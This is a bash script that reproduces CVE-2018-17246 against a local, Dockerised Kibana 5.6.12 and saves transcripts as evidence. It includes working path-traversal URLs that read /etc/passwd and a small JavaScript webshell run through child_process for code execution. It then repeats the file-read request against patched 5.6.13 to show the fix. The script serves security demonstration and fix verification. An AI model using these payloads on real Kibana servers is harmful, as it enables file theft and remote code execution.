#!/bin/bash
# CVE-2018-17246 evidence capture — runs the vulnerable environment, the two
# attack steps, and the fixed environment, saving transcripts to evidence/cve
# and rendering them to PNG with scripts/render_evidence.py.
#
# Usage:  bash scripts/cve_capture.sh
set -u
WORK=/Users/guhaotian/Desktop/work1-secure-api
CVEDIR="$WORK/CVE-2018-17246"
EVID=$WORK/evidence/cve
PY=$WORK/.venv/bin/python
export PATH="$HOME/homebrew/bin:$PATH"
mkdir -p "$EVID"

wait_up() {  # wait for kibana :5601 to answer /api/status (max 1200 s)
  for i in $(seq 1 400); do
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 http://localhost:5601/api/status 2>/dev/null || echo 000)
    [ "$code" = "200" ] && return 0
    sleep 3
  done
  return 1
}
LFI_URL='http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd'
RCE_URL='http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../tmp/vulhub.js'

echo "== 01: start vulnerable environment (Kibana 5.6.12) =="
cd "$CVEDIR"
# keep the already-running (and warm) stack; only start it if needed
docker compose up -d > /tmp/cve_compose_up.log 2>&1
wait_up
{
  echo "\$ cd CVE-2018-17246 && docker compose up -d"
  echo
  tail -3 /tmp/cve_compose_up.log
  echo
  echo "\$ docker compose ps"
  docker compose ps 2>/dev/null
  echo
  echo "\$ curl -s -o /dev/null -w '%{http_code}' http://localhost:5601/api/status"
  curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5601/api/status
} > "$EVID/01_compose_up.txt"

echo "== 02: trigger the local file inclusion =="
{
  echo "\$ curl -i \"$LFI_URL\""
  echo
  curl -s -i "$LFI_URL"
} > "$EVID/02_lfi_request.txt"

echo "== 03: included file content visible in Kibana logs =="
sleep 2
{
  echo "\$ docker compose logs kibana | grep -A6 'Uncaught error: /etc/passwd'"
  echo
  docker compose logs kibana 2>&1 | grep -A6 "Uncaught error: /etc/passwd" | head -20
} > "$EVID/03_lfi_logs.txt"

echo "== 04: escalate to code execution (JS webshell) =="
docker compose exec -T kibana bash -c 'cat > /tmp/vulhub.js << "EOF"
export default {
  asJson: function (req, res) {
    return require("child_process").execSync("id").toString();
  }
}
EOF
echo "wrote /tmp/vulhub.js"' > /tmp/cve_rce_setup.log 2>&1
{
  echo "\$ docker compose exec kibana bash -c 'cat > /tmp/vulhub.js'   # JS webshell"
  echo
  grep -v level=warning /tmp/cve_rce_setup.log
  echo
  echo "\$ curl -i \"$RCE_URL\""
  echo
  curl -s -i "$RCE_URL"
  echo
} > "$EVID/04_rce_request.txt"

echo "== 05: extract the command output =="
{
  echo "\$ curl -s \"$RCE_URL\" | head -c 400"
  echo
  curl -s "$RCE_URL" | head -c 400
  echo
} > "$EVID/05_rce_result.txt"

echo "== 06: stop vulnerable, start fixed (Kibana 5.6.13) =="
docker compose down > /dev/null 2>&1
cd "$CVEDIR"
docker compose -f docker-compose.fixed.yml up -d > /tmp/cve_fix_up.log 2>&1
wait_up
{
  echo "\$ docker compose -f docker-compose.fixed.yml up -d   # Kibana 5.6.13 (patched)"
  echo
  tail -3 /tmp/cve_fix_up.log
  echo
  echo "\$ docker compose -f docker-compose.fixed.yml ps"
  docker compose -f docker-compose.fixed.yml ps 2>/dev/null
  echo
  echo "\$ curl -s -o /dev/null -w '%{http_code}' http://localhost:5601/api/status"
  curl -s -o /dev/null -w '%{http_code}\n' http://localhost:5601/api/status
} > "$EVID/06_fix_compose.txt"

echo "== 07: same LFI against the fixed version =="
{
  echo "\$ curl -i \"$LFI_URL\"   # against patched Kibana 5.6.13"
  echo
  curl -s -i "$LFI_URL"
  echo
  echo "\$ docker compose logs kibana | grep -c 'Uncaught error: /etc/passwd'"
  docker compose -f docker-compose.fixed.yml logs kibana 2>&1 | grep -c "Uncaught error: /etc/passwd"
} > "$EVID/07_lfi_after_fix.txt"

echo "== 08: regression check (normal UI still works) =="
{
  echo "\$ curl -s http://localhost:5601/api/status"
  curl -s http://localhost:5601/api/status | head -c 300
  echo
  echo
  echo "\$ curl -s http://localhost:5601/app/kibana | head -c 200"
  curl -s http://localhost:5601/app/kibana | head -c 200
} > "$EVID/08_regression_ui.txt"

docker compose -f docker-compose.fixed.yml down > /dev/null 2>&1

# render all captures to PNG
$PY "$WORK/scripts/render_evidence.py" "$EVID"
echo "CVE evidence done"
